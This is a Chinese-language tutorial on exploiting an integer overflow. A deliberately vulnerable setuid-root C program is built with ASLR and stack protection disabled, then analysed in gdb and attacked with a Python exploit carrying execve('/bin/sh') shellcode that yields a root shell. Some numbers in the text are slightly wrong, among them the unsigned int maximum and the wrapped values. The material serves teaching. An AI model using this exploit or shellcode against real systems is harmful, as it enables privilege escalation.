## Integer overflow

​	**整数溢出是存储的值大于最大可支持的值**。整数溢出本身不会导致任意代码执行，但整数溢出会导致栈溢出或堆溢出，从而导致任意代码执行。常见的数据类型大小及范围：

| Data Type | size | Unsigned range |      Signed range      |
| :-------: | :--: | :------------: | :--------------------: |
|   char    |  1   |     0~255      |        -128~127        |
|   short   |  2   |    0~65535     |      -32768~32767      |
|    int    |  4   |  0~4294967296  | -2147483648~2147483647 |

​	当尝试存储一个值大于最大可支持的值时，该值会被环绕。比如将 2147483648 存储为带符号的 int 数据类型时，它会被环绕并存储为 -21471483648；-2147483649 存储为带符号的 int 数据类型时，它会被环绕并存储为 21471483647。

​	漏洞代码：

```c
//vuln.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void store_passwd_indb(char* passwd) {}
void validate_uname(char* uname) {}

void validate_passwd(char* passwd) {
	char passwd_buf[11];
 	unsigned char passwd_len = strlen(passwd); /* [1] */ 
 	if(passwd_len >= 4 && passwd_len <= 8) { /* [2] */
  		printf("Valid Password\n"); /* [3] */ 
  		fflush(stdout);
  		strcpy(passwd_buf,passwd); /* [4] */
    } else {
  		printf("Invalid Password\n"); /* [5] */
  		fflush(stdout);
    }
 	store_passwd_indb(passwd_buf); /* [6] */
}

int main(int argc, char* argv[]) {
 	if(argc!=3) {
  		printf("Usage Error:   \n");
  		fflush(stdout);
  		exit(-1);
    }
 	validate_uname(argv[1]);
 	validate_passwd(argv[2]);
 	return 0;
}
```

​	编译代码(禁用ASLR；关闭栈保护；标记堆栈为可执行；ELF文件执行时获得root权限)：

```shell
#echo 0 > /proc/sys/kernel/randomize_va_space 
$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c 
$sudo chown root vuln 
$sudo chgrp root vuln 
$sudo chmod +s vuln
```

​	漏洞代码的第[1]行存在整数溢出漏洞。strlen函数的返回类型是unsighed int, 它存储在unsigned char数据类型中。因此，任何大于unsigned char支持的最大值的值都会导致整数溢出。即当passwd的长度为261时，261被环绕并作为5被存储在变量passwd_len中。由于这个整数溢出，可以绕过第[2]行执行的边界检查，从而导致基于堆栈的缓冲区溢出，从而导致任意代码执行。

​	反汇编代码：

```assembly
(gdb) disassemble validate_passwd
Dump of assembler code for function validate_passwd:
   0x0804849e <+0>:	push   %ebp
   0x0804849f <+1>:	mov    %esp,%ebp
   0x080484a1 <+3>:	push   %edi				
   0x080484a2 <+4>:	sub    $0x34,%esp
   0x080484a5 <+7>:	mov    0x8(%ebp),%eax
   0x080484a8 <+10>:	movl   $0xffffffff,-0x1c(%ebp)
   0x080484af <+17>:	mov    %eax,%edx
   0x080484b1 <+19>:	mov    $0x0,%eax
   0x080484b6 <+24>:	mov    -0x1c(%ebp),%ecx
   0x080484b9 <+27>:	mov    %edx,%edi
   0x080484bb <+29>:	repnz scas %es:(%edi),%al
   0x080484bd <+31>:	mov    %ecx,%eax
   0x080484bf <+33>:	not    %eax
   0x080484c1 <+35>:	sub    $0x1,%eax
   0x080484c4 <+38>:	mov    %al,-0x9(%ebp)
   0x080484c7 <+41>:	cmpb   $0x3,-0x9(%ebp)        //if passwd_len <= 4
   0x080484cb <+45>:	jbe    0x8048500 <validate_passwd+98>
   0x080484cd <+47>:	cmpb   $0x8,-0x9(%ebp)        //if passwd_len >= 8
   0x080484d1 <+51>:	ja     0x8048500 <validate_passwd+98>
   0x080484d3 <+53>:	movl   $0x8048660,(%esp)
   0x080484da <+60>:	call   0x80483a0 <puts@plt>
   0x080484df <+65>:	mov    0x804a020,%eax
   0x080484e4 <+70>:	mov    %eax,(%esp)
   0x080484e7 <+73>:	call   0x8048380 <fflush@plt>
   0x080484ec <+78>:	mov    0x8(%ebp),%eax
   0x080484ef <+81>:	mov    %eax,0x4(%esp)
   0x080484f3 <+85>:	lea    -0x14(%ebp),%eax
   0x080484f6 <+88>:	mov    %eax,(%esp)
   0x080484f9 <+91>:	call   0x8048390 <strcpy@plt>
   0x080484fe <+96>:	jmp    0x8048519 <validate_passwd+123>
   0x08048500 <+98>:	movl   $0x804866f,(%esp)
   0x08048507 <+105>:	call   0x80483a0 <puts@plt>
   0x0804850c <+110>:	mov    0x804a020,%eax
   0x08048511 <+115>:	mov    %eax,(%esp)
   0x08048514 <+118>:	call   0x8048380 <fflush@plt>
   0x08048519 <+123>:	lea    -0x14(%ebp),%eax
   0x0804851c <+126>:	mov    %eax,(%esp)
   0x0804851f <+129>:	call   0x8048494 <store_passwd_indb>
   0x08048524 <+134>:	add    $0x34,%esp
   0x08048527 <+137>:	pop    %edi
   0x08048528 <+138>:	pop    %ebp
   0x08048529 <+139>:	ret    
End of assembler dump.

```

​	堆栈布局：

```
            ...
            passwd			(param)
            return address	 (func_validate_passwd)
            EBP
            EDI
            alignment space
            passwd_buf[8-11] | passwd_len
            passwd_buf[4-7]
            passwd_buf[0-3]
            ...
```

​	`passwd_buf`到`ret_addr`的偏移量为 ：`0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4，0xb是passwd_buf大小，0x1是passwd_len大小，0x4是对齐空间，0x4是EDI, 0x4是EBP。`

​	由于passwd长度为261时，可以绕过第[2]行的边界检查并允许覆盖返回地址。因此，我们可以输入数据`"A"*24 + "B"*4 + "C"*233`来测试，其中`"BBBB"`覆盖了返回地址。得到返回地址为`0xbffff28c`。

```
user@ubuntu:~/projects$ gdb -q vuln
Reading symbols from /home/user/projects/vuln...done.
(gdb) r exploit `python -c 'print "A"*261'`
Starting program: /home/user/projects/vuln exploit `python -c 'print "A"*261'`
Valid Password

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) p/x $eip
$1 = 0x42424242
(gdb) x/x $esp
0xbffff290:	0x43434343
(gdb) x/x $esp-4
0xbffff28c:	0x42424242  ------------------------------>ret_addr
```

​	因此，编写利用代码：

```python
# exp.py
# !/usr/bin/env python
import struct
from subprocess import call

arg1 = "exploit"

# Stack address where shellcode is copied.
ret_addr = 0xbffff2c4        # origin: 0xbffff28c

# Spawn a shell
# execve(/bin/sh)
scode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# endianess convertion
def conv(num):
 return struct.pack("<I",num)

# arg2 = Junk + RA + NOP's + Shellcode
arg2 = "A" * 24
arg2 += conv(ret_addr)
arg2 += "\x90" * 100
arg2 += scode
arg2 += "C" * 108

print "Calling vulnerable program"
call(["./vuln", arg1, arg2])
```

​	执行exploit，得到了root shell，如下：

```
user@ubuntu:~/projects$ python exp.py 
Calling vulnerable program
Valid Password
# whoami
root
```

